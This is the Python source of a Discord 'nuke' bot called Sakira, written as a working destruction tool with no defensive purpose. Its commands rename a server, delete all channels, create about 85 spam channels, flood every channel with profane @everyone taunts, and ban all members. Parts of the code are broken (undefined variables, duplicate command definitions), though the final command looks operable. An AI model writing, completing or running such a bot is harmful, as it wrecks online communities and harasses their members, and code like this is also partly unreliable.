import discord
from discord.ext import commands
import os
import sys
from colorama import Fore
import threading

def clear():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')

def Design():
    print(f'''
  _________       __   .__               
 /   _____/____  |  | _|__|___________   
 \_____  \\__  \ |  |/ /  \_  __ \__  \  
 /        \/ __ \|    <|  ||  | \// __ \_
/_______  (____  /__|_ \__||__|  (____  /
        \/     \/     \/              \/ 
  ___ ___        .__                     
 /   |   \_____  |  |__ _____            
/    ~    \__  \ |  |  \\__  \           
\    Y    // __ \|   Y  \/ __ \_         
 \___|_  /(____  /___|  (____  /         
       \/      \/     \/     \/  
    ''')


prefix='.'

intents=discord.Intents.default()
intents = discord.Intents(messages=True, guilds=True)
client = discord.Client()

client = commands.Bot(command_prefix=prefix, intents=intents)
@client.event
async def on_ready():
    os.system(f"title Connected to Sakira")
    Design()
    await client.change_presence(activity=discord.Game('Sakira Security Inc'))

    print(f'''{Fore.RESET}
{Fore.RED}Bot ID: {client.user.id}{Fore.RED}     {Fore.BLUE} Bot Username: {client.user.name}
{Fore.RED}Sakira Version: {Fore.RED} 1.0.5{Fore.BLUE}{Fore.BLUE}          Bot creator: Peaky 2K21#6259
    ''' + Fore.RESET)


@client.command
async def nuke(ctx):
        await guild.create_text_channel('@everyone this bitch got beamed! Sakira on top bitches')
        await guild.create_text_channel('@everyone this bitch got beamed! Sakira on top bitches')
        await guild.create_text_channel('@everyone this bitch got beamed! Sakira on top bitches')
        await guild.create_text_channel('@everyone this bitch got beamed! Sakira on top bitches')
        await guild.create_text_channel('@everyone this bitch got beamed! Sakira on top bitches')
        await guild.create_text_channel('@everyone this bitch got beamed! Sakira on top bitches')
        await guild.create_text_channel('@everyone this bitch got beamed! Sakira on top bitches')
        await guild.create_text_channel('@everyone this bitch got beamed! Sakira on top bitches')
        await guild.create_text_channel('@everyone this bitch got beamed! Sakira on top bitches')
        await guild.create_text_channel('@everyone this bitch got beamed! Sakira on top bitches')
        await guild.create_text_channel('@everyone this bitch got beamed! Sakira on top bitches')
        await guild.create_text_channel('@everyone this bitch got beamed! Sakira on top bitches')
        await guild.create_text_channel('@everyone this bitch got beamed! Sakira on top bitches')
        await guild.create_text_channel('@everyone this bitch got beamed! Sakira on top bitches')

@client.command
async def nuke(ctx):
        for mem in guild.members:
            try:
                 currentDT = datetime.datetime.now()
                 hour = str(currentDT.hour)
                 minute = str(currentDT.minute)
                 second = str(currentDT.second)
                 count = count + 1
                 await mem.ban()
                 os.system(f"title Banning Everyone - [{count}]")
                 print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} User Banned: {Fore.RED} :{Fore.WHITE} {mem.name}")
            except:
                 print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Problem Banning {Fore.RED} :{Fore.WHITE} {mem.name}")
                 input(f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Finished Banning... {Fore.RED}:{Fore.WHITE} [{count}] \n[>] ")


@client.command()
async def nuke(ctx):

    await ctx.guild.edit(name='Sakira on top!')

    for c in ctx.guild.channels:
        await c.delete()

    guild = ctx.message.guild

    n=0
    while(n<=85):
        await guild.create_text_channel('Beamed your ass and your mad!')
        n = n+1

    for c in ctx.guild.text_channels:
             await c.send('@everyone Beamed your ass')
             await c.send('@everyone You aint getting shit')
             await c.send('@everyone Cant beat me')
             await c.send('@everyone I am Sakira')
             await c.send('@everyone We are untouched')
             await c.send('@everyone Have fun remaking the server!')
             await c.send('@everyone How does it feel losing all the members?')
             await c.send('@everyone You crying bro?')
             await c.send('@everyone Relax we wont touch you again')
             await c.send('@everyone Maybe one day...')
             await c.send('@everyone You can fix your shit server :)')
             await c.send('@everyone Get beamed kids')
             await c.send('@everyone Haha :)')
             await c.send('@everyone Beamed your ass and your mad')
             await c.send('@everyone Cya bitches')
             await c.send('@everyone Remember that you got beamed by Sakira :)')


client.run('TOKEN')
